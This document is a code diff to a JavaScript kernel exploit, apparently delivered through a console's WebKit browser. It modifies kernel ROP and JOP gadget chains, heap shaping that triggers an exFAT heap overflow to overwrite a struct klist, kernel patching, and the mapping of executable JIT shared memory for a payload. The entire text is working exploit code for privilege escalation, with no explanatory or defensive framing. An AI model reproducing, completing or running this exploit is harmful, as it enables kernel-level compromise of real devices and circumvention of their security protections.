@@ -635,7 +635,7 @@ class Chain800 extends Chain800Base {
         this.ta_clone.scrollLeft;
     }
 }
-const Chain = Chain803;
+const Chain = Chain800;
 
 function init(Chain) {
     [libwebkit_base, libkernel_base, libc_base] = get_bases();
@@ -788,6 +788,8 @@ function mlock_kchain(kchain) {
 
 // pivots back to the original kernel stack with interrupts enabled
 function push_krop_end(kchain) {
+    // leave
+    // jmp gadgets['sti; ret']
     kchain.push_gadget('pop rcx; ret');
     kchain.push_value(kchain.get_gadget('sti; ret'));
     kchain.push_gadget('leave; jmp rcx');
@@ -922,7 +924,7 @@ function prepare_knote(kchain) {
 
 // malloc/free until the heap is shaped in a certain way, such that the exFAT
 // heap oveflow bug overwrites a struct klist
-function trigger_oob(kchain) {
+function trigger_oob(kchain, mmap_area) {
     const chain = new Chain();
 
     const num_kqueue = 0x1b0;
@@ -997,8 +999,9 @@ function trigger_oob(kchain) {
     const kretval = kchain.return_value;
     debug_log(`kchain retval: ${kretval}`);
     debug_log(kchain.jmp_buf);
-    debug_log(new Addr(0x4000).read64(0));
-    if (!kretval.eq('0xdeadbeefbeefdead')) {
+    const check = mmap_area.read64(0);
+    debug_log(check);
+    if (kretval.eq(0)) {
         die('heap overflow failed');
     }
     debug_log('kernel ROP chain ran successfully');
@@ -1091,10 +1094,9 @@ async function kexec_payload(kchain, sd, mmap_area, scratch) {
     const prot_rx = 5;
     // PROT_READ | PROT_WRITE
     const prot_rw = 3;
-    const map_shared = 1;
+    const MAP_SHARED = 1;
 
     const exec_handle = chain.syscall('jitshm_create', 0, map_size, prot_rwx);
-
     const write_handle = chain.syscall('jitshm_alias', exec_handle, prot_rw);
 
     const exec_addr = new Addr(
@@ -1103,7 +1105,7 @@ async function kexec_payload(kchain, sd, mmap_area, scratch) {
             '0x900000000',
             map_size,
             prot_rx,
-            map_shared,
+            MAP_SHARED, // this flag is required
             exec_handle,
             0,
         )
@@ -1115,7 +1117,7 @@ async function kexec_payload(kchain, sd, mmap_area, scratch) {
             '0x910000000',
             map_size,
             prot_rw,
-            map_shared,
+            MAP_SHARED, // this flag is required
             write_handle,
             0,
         )
@@ -1217,12 +1219,10 @@ async function kexec_payload(kchain, sd, mmap_area, scratch) {
 
     // have the payload return EINVAL for us, read push_ret_einval() for why
     const EINVAL = 22;
-    // kpatch(kbase, EINVAL, NULL)
+    // kpatch(EINVAL, NULL)
     kchain.push_gadget('pop rdi; ret');
-    kchain.push_value(kbase);
-    kchain.push_gadget('pop rsi; ret');
     kchain.push_constant(EINVAL);
-    kchain.push_gadget('pop rdx; ret');
+    kchain.push_gadget('pop rsi; ret');
     kchain.push_constant(0);
 
     push_krop_end(kchain);
@@ -1267,7 +1267,7 @@ async function kexploit() {
         rax_ptrs,
         scratch,
     ] = prepare_knote(kchain);
-    const [sd, kretval] = trigger_oob(kchain);
+    const [sd, kretval] = trigger_oob(kchain, mmap_area);
 
     // offset relative to kernel base
     const offset_k_socketops_fo_chmod = 0x1a76060;
@@ -1276,7 +1276,7 @@ async function kexploit() {
 
     // setup for fchmod() kernel ROP chain
     mmap_area.write64(8, jop_buffer);
-    rax_ptrs.write64(0x70, kchain.get_gadget(jop2));
+    rax_ptrs.write64(0x70, kchain.get_gadget(jop3));
 
     const p_ucred = get_ucred_addr(kchain, sd, mmap_area);
     debug_log(`p_ucred: ${p_ucred}`);
